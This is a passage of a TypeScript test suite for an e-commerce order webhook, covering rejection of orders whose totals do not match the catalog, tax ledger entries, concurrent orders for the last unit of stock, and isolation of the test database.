    const orderNumber = "MISMATCH-" + randomUUID().substring(0, 6);
    const orderPayload = JSON.stringify({
      customer_name: "Tamper Tester",
      customer_email: "tamper@test.io",
      order_number: orderNumber,
      total_amount: 10.00, // Inconsistent with catalog unit price ($240.00)
      items: [{ sku: "HW-IOT-99", quantity: 1 }],
    });

    const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(orderPayload).digest("hex");
    const req = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Signature": sig },
      body: orderPayload,
    });

    const res = await handleHttpRequest(req);
    expect(res.status).toBe(422);

    const json = await res.json();
    expect(json.code).toBe("ORDER_TOTAL_MISMATCH");
    expect(json.received_total).toBe(10.00);
    expect(json.expected_total).toBe(240.00);

    // Order must NOT be saved in pipeline_states
    const orderRow = db.query<any, { $id: string }>(
      "SELECT * FROM pipeline_states WHERE id = $id"
    ).get({ $id: "pip_ord_" + orderNumber });
    expect(orderRow).toBeNull();
  });

  it("should accept orders with matching reconciled catalog totals and taxes", async () => {
    // 1 unit of HW-IOT-99 ($240.00) + $19.20 tax = $259.20
    const orderNumber = "TAXED-" + randomUUID().substring(0, 6);
    const orderPayload = JSON.stringify({
      customer_name: "Taxed Buyer",
      customer_email: "taxed@test.io",
      order_number: orderNumber,
      total_amount: 259.20,
      tax_amount: 19.20,
      items: [{ sku: "HW-IOT-99", quantity: 1 }],
    });

    const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(orderPayload).digest("hex");
    const req = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Signature": sig },
      body: orderPayload,
    });

    const res = await handleHttpRequest(req);
    expect(res.status).toBe(201);
    const json = await res.json();
    expect(json.success).toBe(true);

    // Verify double-entry ledger entries (debit cash $259.20, credit revenue $240.00, credit tax_payable $19.20)
    verifyTransactionGroupBalance(json.transaction_group_id, db);

    const taxEntry = db.query<any, { $tx: string }>(
      "SELECT amount FROM ledger_entries WHERE transaction_group_id = $tx AND account = 'tax_payable'"
    ).get({ $tx: json.transaction_group_id });
    expect(taxEntry?.amount).toBe(19.20);
  });
});

describe("17. Concurrent Orders Competing for Same Remaining Stock", () => {
  it("should allow only one order to claim the last remaining unit and reject the competing order without overselling", async () => {
    // Create a special scarce item with stock_qty = 1
    const scarceSku = "SCARCE-" + randomUUID().substring(0, 4);
    db.query(`
      INSERT INTO catalog_items (id, sku, name, type, stock_qty, unit_price, cost_price, currency)
      VALUES ($id, $sku, 'Scarce Quantum Chip', 'physical', 1, 500.00, 200.00, 'USD')
    `).run({
      $id: "cat_" + scarceSku,
      $sku: scarceSku,
    });

    const makeOrderReq = (buyerName: string, orderNum: string) => {
      const payload = JSON.stringify({
        customer_name: buyerName,
        customer_email: `${buyerName.toLowerCase()}@test.io`,
        order_number: orderNum,
        total_amount: 500.00,
        items: [{ sku: scarceSku, quantity: 1 }],
      });
      const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(payload).digest("hex");
      return new Request("http://localhost:8080/api/webhooks/order", {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Signature": sig },
        body: payload,
      });
    };

    const reqA = makeOrderReq("BuyerAlpha", "RACE-A-" + randomUUID().substring(0, 4));
    const reqB = makeOrderReq("BuyerBeta", "RACE-B-" + randomUUID().substring(0, 4));

    // Execute concurrently
    const [resA, resB] = await Promise.all([
      handleHttpRequest(reqA),
      handleHttpRequest(reqB),
    ]);

    const statuses = [resA.status, resB.status];
    expect(statuses).toContain(201);
    expect(statuses).toContain(422);

    // Remaining stock must be precisely 0 (never negative, zero overselling)
    const stockRow = db.query<any, { $sku: string }>(
      "SELECT stock_qty FROM catalog_items WHERE sku = $sku"
    ).get({ $sku: scarceSku });
    expect(stockRow?.stock_qty).toBe(0);
  });
});

describe("18. Test Database Isolation & Zero Production Touch", () => {
  it("should ensure tests operate on an isolated test database and do not touch bos.db", () => {
    // Verify current test database filename
    expect(db.filename).toContain("test_bos.db");
    expect(db.filename).not.toMatch(/[/\\]bos\.db$/);
  });
});

